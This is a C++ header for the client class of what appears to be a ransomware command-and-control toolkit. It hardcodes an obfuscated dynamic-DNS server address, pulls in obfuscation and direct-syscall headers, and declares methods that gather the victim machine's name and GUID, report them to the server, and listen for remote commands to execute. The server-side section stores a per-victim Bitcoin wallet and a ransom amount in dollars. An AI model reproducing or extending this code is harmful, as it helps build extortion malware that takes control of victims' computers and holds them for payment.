#ifndef _CLIENT_H_
#define _CLIENT_H_

#include "procmgr.h"
#include "framework.h"
#include "net_types.h"
#include "net_common.h"
#include "natives.h"
#include "syscalls.h"

#include "External/obfuscate.h"
#include "External/base64.h"

#include <memory>
#include <algorithm>
#include <random>
#include <openssl/bio.h>
#include <filesystem>

#pragma comment( lib, "ws2_32.lib" )

const unsigned int UDP_PORT = 5454;
const std::string  DNS_NAME = std::string(HIDE("logicgate-test.ddns.net"));

class Client {
public:
    inline const SOCKET      GetSocket(SocketTypes type) const { return ( type == TCP ) ? this->m_TCPSocket : this->m_UDPSocket; }
    inline const RSAKeys     GetSecrets() const { return this->m_Secrets; }
    inline const Server      GetServerDetails(SocketTypes type) const { return ( type == TCP ) ? this->m_TCPServerDetails : this->m_UDPServerDetails; }
    inline const sockaddr_in GetAddressInfo() const { return this->m_AddressInfo; }
    inline const std::string GetDesktopName() const { return this->m_ComputerName; }
    inline void              SetDesktopName(auto name) { this->m_ComputerName = name; }
    inline const std::string GetMachineGUID() const { return this->m_MachineGUID; }
    inline void              SetMachineGUID(auto name) { this->m_MachineGUID = name; }
    inline void              SetEncryptionKeys(RSAKeys& keys) { this->m_Secrets = keys; }

private:
    std::string    m_ComputerName = "unknown";
    std::string    m_MachineGUID = "unknown";
    Server         m_TCPServerDetails = {};
    Server         m_UDPServerDetails = {};
    SOCKET         m_UDPSocket        = INVALID_SOCKET;
    SOCKET         m_TCPSocket        = INVALID_SOCKET;
    sockaddr_in    m_AddressInfo      = {};
    RSAKeys        m_Secrets          = {};

#ifdef CLIENT_RELEASE // Client only methods
public:
    Client();
    ~Client();

    ProcessManager ProcManager;

    BOOL           Connect(); // Connect to the tcp server
    BOOL           Disconnect(); // Disconnect from the tcp server
    BYTESTRING     MakeTCPRequest(ClientRequest req, BOOL encrypted = FALSE); // send a message, receive the response
    BOOL           SendMessageToServer(Server dest, ClientMessage message, sockaddr_in udpAddr = NetCommon::_default);
    BOOL           SendEncryptedMessageToServer(Server dest, ClientMessage message);
    BOOL           ListenForServerCommands(); // listen for commands from the server and perform them
    template <typename _Ty>
    BOOL           ReceiveMessageFromServer(Server who, _Ty& out, sockaddr_in& outAddr);
    BOOL           SendComputerNameToServer();

private:
    void           ReceiveCommandsFromServer(); // thread to continously receive 'ServerCommand' messages from the server
    void           SetRemoteComputerName();     // set this->m_ComputerName to the current PCs desktop name
    void           SetRemoteMachineGUID();      // set this->m_MachineGUID to the current PCs windows machine guid
    BOOL           GetPublicRSAKeyFromServer(); // get public rsa key from server, save it to this->m_Secrets as a string
    BOOL           SendMachineGUIDToServer();

#elif defined(SERVER_RELEASE) // Server only client implementation
public:
    Client() = default;
    Client(SOCKET tcp, SOCKET udp, sockaddr_in addr) 
        : m_AddressInfo(addr), m_TCPSocket(tcp), m_UDPSocket(udp) 
    {
        std::random_device gen;
        std::mt19937 rng(gen());
        std::uniform_int_distribution<std::mt19937::result_type> dist(1, 10400);
        this->ClientUID = dist(rng);
    }

    long           ClientUID = -1;
    std::string    UniqueBTCWalletAddress; // Wallet address to send ransom money to
    long           RansomAmountUSD;

    /*
        Implementation for event handling- to wait
        for a new message to be sent from a client.

        Server will be listening from each client that connects with a thread.
        When data is received, it will be inserted into ClientResponse if ExpectingResponse
        is set to true by a function. This allows us to make a WaitForClientResponse function
        that sets expecting response to true and consistantly checks recent client response
        against last client response, waiting for a new client response.
    */
    BOOL           ExpectingResponse; // Expecting a ClientResponse from a client not a clientREQUEST
    ClientResponse RecentClientResponse;
    ClientResponse LastClientResponse;
#endif
};


#endif